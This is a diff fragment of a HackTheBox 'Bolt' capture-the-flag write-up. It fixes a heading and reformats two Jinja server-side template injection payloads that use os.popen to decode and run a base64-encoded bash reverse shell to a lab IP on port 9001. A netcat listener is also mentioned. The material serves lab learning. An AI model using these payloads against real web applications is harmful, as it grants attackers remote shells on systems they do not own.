@@ -19,7 +19,7 @@ The room is completed on November 25th, 2021
 
 <!-- TOC -->
 
-- [HackTheBoxHTB - Bolt - WriteUp](#hacktheboxhtb---bolt---writeup)
+- [HackTheBox(HTB) - Bolt - WriteUp](#hacktheboxhtb---bolt---writeup)
     - [Table of Contents](#table-of-contents)
     - [Let's Begin Here !!!](#lets-begin-here-)
         - [Network Reconnaissance](#network-reconnaissance)
@@ -2737,7 +2737,7 @@ We can search for SSTI reverse shell payload, [here is what we found useful](htt
 Based on the article, we can use the payload below to get reverse shell and notice there is base64 encode for the reverse shell code.
 
 ```bash
-{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
+{ % with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() % } a { % endwith % }
 ```
 
 If you decode the base64, you will get:
@@ -2755,7 +2755,7 @@ echo -n "bash -i >& /dev/tcp/10.10.14.18/9001 0>&1" | base64
 Then, we include the reverse shell payload into the SSTI payload as below:
 
 ```python
-{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjE= | base64 -d | bash")["read"]() %} a {% endwith %}
+{ % with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjE= | base64 -d | bash")["read"]() % } a { % endwith % }
 ```
 
 We also setup netcat listener to catch the reverse shell callback.
